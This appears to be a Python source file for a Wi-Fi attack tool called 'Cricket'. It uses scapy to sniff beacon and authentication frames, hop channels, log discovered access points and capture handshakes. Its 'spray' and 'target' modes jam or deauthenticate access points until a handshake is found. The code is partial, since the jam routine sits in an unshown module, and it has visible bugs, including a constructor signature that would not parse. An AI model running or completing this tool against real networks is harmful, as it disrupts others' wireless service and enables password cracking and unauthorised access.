#!/bin/python3
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap
from scapy.utils import PcapWriter

from time import sleep

import threading

from subprocess import Popen

import logging
logger = logging.getLogger(__name__)

from AP import AccessPoint

class Cricket():
	def __init__(self, ignoreBeacons, attackMode, sendint, recvint, output, searchingChannels, targets=[], queue):
		self.ignoreBeacons = ignoreBeacons
		self.attackMode = attackMode
		self.sendint = sendint
		self.recvint = recvint
		self.output = output
		self.searchingChannels = searchingChannels
		self.targets = targets
		self.queue = queue

		self.handshakesFound = {}
		self.discoveredAPs = []
		self.channelIndex = 0
		self.threads = []
		self.running = True

	def freqToChannel(self, freq):
		base = 2407			# 2.4Ghz
		if freq // 1000 == 5: 
			base = 5000		# 5Ghz
		# 2.4 and 5Ghz channels increment by 5
		return (freq - base)//5


	def changeChannel(self, newChannel, interface):
		command = ['iwconfig', interface, 'channel', str(newChannel)]

		Popen(command, shell=False)

		logging.debug('Set channel to ' + str(newChannel) + ' on ' + interface)

	def channelHop(self):
		# if the channel index is that of the last in the searchingChannels list, reset it to 0
		if self.channelIndex == len(self.searchingChannels) - 1:
			self.channelIndex = 0
		# otherwise, increment by 1
		else:
			self.channelIndex += 1
		# Then change channel
		self.changeChannel(self.searchingChannels[self.channelIndex], self.recvint)
		# These variables solely keep track of the channels we sniff on; it has no effect on any of the attacks

	def sniffPackets(self):
		packets = sniff(count = 5, iface=self.recvint)
		for packet in packets:
			# If the packet is a frame...
			if packet.haslayer(Dot11):
					# If the packet is a management frame
					if packet.type == 0:
						essid = bytes.decode(packet[Dot11Elt].info)
						bssid = packet.addr2
						# If the packet is a beacon frame
						if packet.subtype == 8:
							# If it isn't to be ignored
							if essid not in self.ignoreBeacons or bssid not in self.ignoreBeacons:
								# add bssid to discoveredAPs
								# create new AccessPoint class and append to targets
								# ensure we don't sniff further beacons by adding to ignoreBeacons
								channel = self.freqToChannel(packet[RadioTap].Channel)
								self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
								self.ignoreBeacons.append(bssid)
								logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
						# Elif the packet is an authentication frame
						elif packet.subtype == 11:
							# if a handshake hasn't been captured
							if bssid not in list(self.handshakesFound.keys()):
								# Note it's been captured and write to output file if one exists
								self.handshakesFound[bssid] = packet
								logging.info('New Authentication Frame Found: ESSID = ' + essid)
					
					else:
						logging.debug('Found non-auth, non-beacon management frame')
			else:
				logging.debug('Found non-management frame transmission')
		self.channelHop()

	def sprayAttack(self):
		# Spray attacks every located target until it gets a handshake
		for AccessPoint in self.discoveredAPs:
			if AccessPoint.bssid not in list(self.handshakesFound.keys()):
				self.changeChannel(AccessPoint.channel, self.sendint)
				AccessPoint.jam(self.sendint)

	def unarmedAttack(self):
		# Do not send any deauth
		return

	def targetAttack(self):
		# Only deauth targets
		for AccessPoint in self.discoveredAPs:
			if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
				self.changeChannel(AccessPoint.channel, self.sendint)
				AccessPoint.jam(self.sendint)
	
	def attack(self):
		# All three attacks condensed into one single switch
		if self.attackMode == 'spray':
			self.sprayAttack()
		elif self.attackMode == 'unarmed':
			self.unarmedAttack()
		elif self.attackMode == 'target':
			self.targetAttack()
		else:
			logging.debug('No attack mode set')